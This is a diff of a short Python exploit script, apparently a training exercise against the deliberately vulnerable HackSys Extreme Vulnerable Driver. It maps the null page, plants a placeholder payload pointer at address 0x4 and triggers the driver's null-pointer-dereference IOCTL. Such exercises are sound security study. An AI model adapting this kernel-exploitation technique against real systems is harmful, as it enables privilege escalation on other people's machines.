@@ -139,17 +139,16 @@ def main():
     kernel32 = windll.kernel32
     psapi = windll.Psapi
     ntdll = windll.ntdll
-    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
     
+    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
     shellcode = id("\x41" * 4) + 20
- 
+    
     ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
- 
     kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, shellcode, 0x40, byref(c_ulong()))
-
+    
     buf = '\x90\x90\x90\x90'
     bufLength = len(buf)
- 
+    
     kernel32.DeviceIoControl(hevDevice, 0x22202b, buf, bufLength, None, 0, byref(c_ulong()), None)
  
 if __name__ == "__main__":
